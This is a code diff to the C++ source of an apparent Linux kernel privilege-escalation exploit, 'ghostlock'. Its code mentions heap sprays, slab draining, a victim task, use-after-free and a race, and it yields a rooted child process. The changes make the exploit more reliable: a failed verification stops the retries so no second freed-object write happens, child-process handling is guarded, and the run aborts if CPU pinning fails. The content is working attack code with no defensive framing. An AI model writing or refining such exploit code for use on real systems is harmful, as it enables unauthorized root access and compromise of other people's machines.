@@ -62,9 +62,13 @@ namespace ghostlock::session::backend {
                 pr_info("%s attempt %u/%u\n", stage, attempt, attempts);
 
                 /* the previous attempt's write can land after its verify read; check
-                 * before paying for another heap spray */
-                if (attempt > 1 && verify(context)) {
-                    return true;
+                 * before paying for another heap spray. A negative result is
+                 * terminal: the verified object (W2's victim task) is gone, so
+                 * another write through it would be a use-after-free. */
+                if (attempt > 1) {
+                    const int32_t previous = verify(context);
+                    if (previous > 0) return true;
+                    if (previous < 0) return false;
                 }
                 if (attempt == 1) {
                     attack::slab_drain();
@@ -83,11 +87,13 @@ namespace ghostlock::session::backend {
                     if (!M::w2_fast_repair_activate(session)) return false;
                 }
                 if (settle_usec) usleep(settle_usec);
-                if (verify(context)) return true;
+                const int32_t verified = verify(context);
+                if (verified > 0) return true;
+                if (verified < 0) return false;
                 usleep(50000);
             }
             /* the last write can land after its verify read */
-            return verify(context) != 0;
+            return verify(context) > 0;
         }
 
         /* W3 chain retry: park the previous rooted child on its command pipe so the
@@ -223,12 +229,16 @@ namespace ghostlock::session::backend {
                 g_exploit_session.profile.w2_settle_us(),
                 victim::verify_w2_stage, &w2_context, 0);
             if (!got_root) {
-                write(pipes.cmd_write.get(), "X", 1);
+                if (pipes.child() > 0) {
+                    write(pipes.cmd_write.get(), "X", 1);
+                }
                 pipes.cmd_write.reset();
                 pipes.uid_read.reset();
                 pr_warning("W2 failed after %u rounds\n",
                            g_exploit_session.profile.w2_attempts());
-                waitpid(pipes.child(), nullptr, WNOHANG);
+                if (pipes.child() > 0) {
+                    waitpid(pipes.child(), nullptr, WNOHANG);
+                }
                 return VictimRound::Failed;
             }
             support::run_state::complete("w2a");
@@ -456,7 +466,11 @@ namespace ghostlock::session::backend {
         attack::apply_iomem_cache();
         support::log_startup_context();
         support::init_p0_profile();
-        kernel::pin_to_core(static_cast<size_t>(config::runtime_config_snapshot().main_cpu));
+        if (!kernel::pin_to_core(
+                static_cast<size_t>(config::runtime_config_snapshot().main_cpu))) {
+            pr_error("main cpu affinity failed; aborting before the race\n");
+            return StageResult::Failed;
+        }
         pr_info("main thread running on cpu=%d\n", sched_getcpu());
 
         attack::timer_reset();
